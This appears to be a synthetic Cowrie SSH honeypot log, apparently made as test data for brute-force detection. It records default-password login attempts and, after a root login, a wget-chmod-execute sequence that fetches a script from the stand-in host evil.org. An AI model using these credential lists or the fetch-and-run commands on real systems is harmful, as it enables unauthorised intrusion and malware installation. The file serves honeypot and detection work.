2025-07-19T09:50:02+0000 [SSHService ssh-connection] New connection from 203.0.113.88:51433
2025-07-19T09:50:03+0000 [CowrieSSHFactory] login attempt [user: admin, password: admin]
2025-07-19T09:50:04+0000 [SSHChannel] login failed [admin/admin]
2025-07-19T09:50:10+0000 [CowrieSSHFactory] login attempt [user: root, password: root]
2025-07-19T09:50:11+0000 [SSHChannel] login failed [root/root]
2025-07-19T09:51:05+0000 [CowrieSSHFactory] login attempt [user: guest, password: guest]
2025-07-19T09:51:06+0000 [SSHChannel] login failed [guest/guest]
2025-07-19T09:52:00+0000 [CowrieSSHFactory] login attempt [user: test, password: test]
2025-07-19T09:52:01+0000 [SSHChannel] login failed [test/test]
2025-07-19T09:52:15+0000 [CowrieSSHFactory] login attempt [user: user, password: 123456]
2025-07-19T09:52:16+0000 [SSHChannel] login failed [user/123456]
2025-07-19T09:52:20+0000 [CowrieSSHFactory] login attempt [user: admin, password: admin123]
2025-07-19T09:52:21+0000 [SSHChannel] login failed [admin/admin123]
2025-07-19T09:52:35+0000 [CowrieSSHFactory] login attempt [user: root, password: passw0rd]
2025-07-19T09:52:36+0000 [SSHChannel] login failed [root/passw0rd]
2025-07-19T09:52:45+0000 [CowrieSSHFactory] login attempt [user: root, password: toor]
2025-07-19T09:52:46+0000 [SSHChannel] login successful [root/toor]
2025-07-19T09:52:48+0000 [SSHChannel] command input: uname -a
2025-07-19T09:52:50+0000 [SSHChannel] command input: wget http://evil.org/malware.sh
2025-07-19T09:52:52+0000 [SSHChannel] command input: chmod +x malware.sh
2025-07-19T09:52:55+0000 [SSHChannel] command input: ./malware.sh
2025-07-19T09:52:57+0000 [SSHChannel] command input: exit
2025-07-19T09:53:00+0000 [CowrieSSHFactory] session closed

# 20+ more login attempts for brute force detection
2025-07-19T10:00:00+0000 [CowrieSSHFactory] login attempt [user: admin, password: qwerty]
2025-07-19T10:00:01+0000 [SSHChannel] login failed [admin/qwerty]
2025-07-19T10:00:03+0000 [CowrieSSHFactory] login attempt [user: admin, password: admin1]
2025-07-19T10:00:04+0000 [SSHChannel] login failed [admin/admin1]
2025-07-19T10:00:06+0000 [CowrieSSHFactory] login attempt [user: pi, password: raspberry]
2025-07-19T10:00:07+0000 [SSHChannel] login failed [pi/raspberry]
2025-07-19T10:00:10+0000 [CowrieSSHFactory] login attempt [user: admin, password: admin1234]
2025-07-19T10:00:11+0000 [SSHChannel] login failed [admin/admin1234]
2025-07-19T10:00:14+0000 [CowrieSSHFactory] login attempt [user: root, password: root123]
2025-07-19T10:00:15+0000 [SSHChannel] login failed [root/root123]
2025-07-19T10:00:18+0000 [CowrieSSHFactory] login attempt [user: user, password: password]
2025-07-19T10:00:19+0000 [SSHChannel] login failed [user/password]
2025-07-19T10:00:22+0000 [CowrieSSHFactory] login attempt [user: test, password: 1234]
2025-07-19T10:00:23+0000 [SSHChannel] login failed [test/1234]
2025-07-19T10:00:26+0000 [CowrieSSHFactory] login attempt [user: admin, password: root]
2025-07-19T10:00:27+0000 [SSHChannel] login failed [admin/root]
